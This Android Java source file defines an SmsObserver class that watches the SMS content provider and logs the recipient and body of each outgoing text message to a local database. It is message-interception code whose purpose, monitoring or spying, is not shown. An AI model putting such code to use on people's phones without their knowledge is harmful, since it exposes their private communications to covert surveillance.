package org.darkdefender.interceptor.observers;

import java.util.Date;

import org.darkdefender.interceptor.database.DataSource;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SmsObserver extends ContentObserver{

	private static Context ctx;
	private final static String CONTENT_SMS = "content://sms";
	private final static int MESSAGE_TYPE_SENT = 2;
	
	public SmsObserver(Handler handler, Context context) {
		super(handler);
		ctx = context;
	}

	public void onChange(boolean selfChange){
	    Cursor cursor = ctx.getContentResolver().query(
	    Uri.parse(CONTENT_SMS), null, null, null, null);
	    
	    DataSource ds = new DataSource(ctx);
	    ds.open();
	    
		 if (cursor.moveToNext()) {
			  String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
			  int type = cursor.getInt(cursor.getColumnIndex("type"));
			  // Only processing outgoing sms event & only when it
			  // is sent successfully (available in SENT box).
			  if (protocol != null 
					  || type != MESSAGE_TYPE_SENT) { return; }
			  
//			  int dateColumn = cursor.getColumnIndex("date");
			  int bodyColumn = cursor.getColumnIndex("body");
			  int addressColumn = cursor.getColumnIndex("address");
//			  String from = "0";
			  String to = cursor.getString(addressColumn);
//			  Date now = new Date(cursor.getLong(dateColumn));
			  String msg = cursor.getString(bodyColumn);   
			  
			  ds.addSMSMessage(new Date().getTime(), 
					  false, 
					  "", 
					  to, 
					  msg);
		  }
		 ds.close();
	 }
	
	
}
